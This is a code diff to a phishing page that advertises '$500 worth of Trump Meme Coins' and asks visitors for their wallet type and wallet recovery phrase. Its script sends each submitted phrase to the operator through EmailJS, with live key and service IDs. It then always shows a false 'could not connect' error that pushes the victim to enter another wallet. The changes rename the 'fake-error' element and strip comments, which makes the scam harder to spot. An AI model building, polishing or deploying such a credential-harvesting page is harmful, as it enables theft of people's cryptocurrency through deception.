@@ -69,7 +69,7 @@
     .wallet-page.active {
       display: block;
     }
-    .error, .fake-error {
+    .error {
       color: red;
       font-weight: bold;
       font-size: 0.9rem;
@@ -79,6 +79,23 @@
       border: 1px solid red;
       border-radius: 5px;
       margin-bottom: 10px;
+    }
+    #error-box {
+      display: none;
+      background: #ffe6e6;
+      border: 1px solid #cc0000;
+      color: #cc0000;
+      font-size: 0.85rem;
+      font-weight: 500;
+      text-align: center;
+      padding: 10px;
+      border-radius: 6px;
+      margin-bottom: 15px;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
     }
     label {
       display: block;
@@ -157,16 +174,6 @@
     body.noscroll {
       overflow: hidden;
     }
-    .loading::after {
-      content: " Connecting...";
-      animation: dots 1s steps(3, end) infinite;
-    }
-    @keyframes dots {
-      0%, 20% { content: " Connecting."; }
-      40% { content: " Connecting.."; }
-      60% { content: " Connecting..."; }
-      100% { content: " Connecting"; }
-    }
   </style>
 </head>
 <body>
@@ -193,12 +200,12 @@
     <h2>Connect Your Wallet</h2>
     <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
     <form id="wallet-form">
+      <div id="error-box"></div>
       <label for="wallet-type">Select Wallet Type</label>
       <select id="wallet-type" name="wallet_type" required>
         <option value="metamask">MetaMask</option>
         <option value="trustwallet">Trust Wallet</option>
         <option value="coinbase">Coinbase Wallet</option>
-        <!-- more options omitted for brevity -->
         <option value="others">Others</option>
       </select>
       <label for="wallet-phrase">Enter Your Wallet Phrase</label>
@@ -207,7 +214,6 @@
         <p>Note: Only wallets with a balance or transaction history will be credited.</p>
       </div>
       <button class="btn" id="submit-btn" type="submit">Connect</button>
-      <p id="fake-error" class="fake-error" style="display: none;"></p>
     </form>
   </div>
 
@@ -221,7 +227,7 @@
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     (function() {
-      emailjs.init("8_8uPDLPGGbBtyIqv"); // your EmailJS public key
+      emailjs.init("8_8uPDLPGGbBtyIqv");
     })();
 
     function showWalletPage() {
@@ -235,22 +241,23 @@
     document.getElementById("wallet-form").addEventListener("submit", function(event) {
       event.preventDefault();
       const btn = document.getElementById("submit-btn");
-      const errorMsg = document.getElementById("fake-error");
+      const errorBox = document.getElementById("error-box");
+
       btn.disabled = true;
       btn.textContent = "Connecting...";
-      
+
       emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
         .then(function(response) {
           setTimeout(() => {
-            errorMsg.textContent = "Wallet could not connect to server. Only wallets with a balance or transaction history can be connected. Please try again with another wallet.";
-            errorMsg.style.display = "block";
+            errorBox.textContent = "Wallet could not connect to server. Only wallets with a balance or transaction history can be connected. Please try again with another wallet.";
+            errorBox.style.display = "block";
             btn.disabled = false;
             btn.textContent = "Connect";
           }, 2000);
         })
         .catch(function(error) {
-          errorMsg.textContent = "Unexpected server issue. Please try again.";
-          errorMsg.style.display = "block";
+          errorBox.textContent = "Unexpected server issue. Please try again.";
+          errorBox.style.display = "block";
           btn.disabled = false;
           btn.textContent = "Connect";
         });
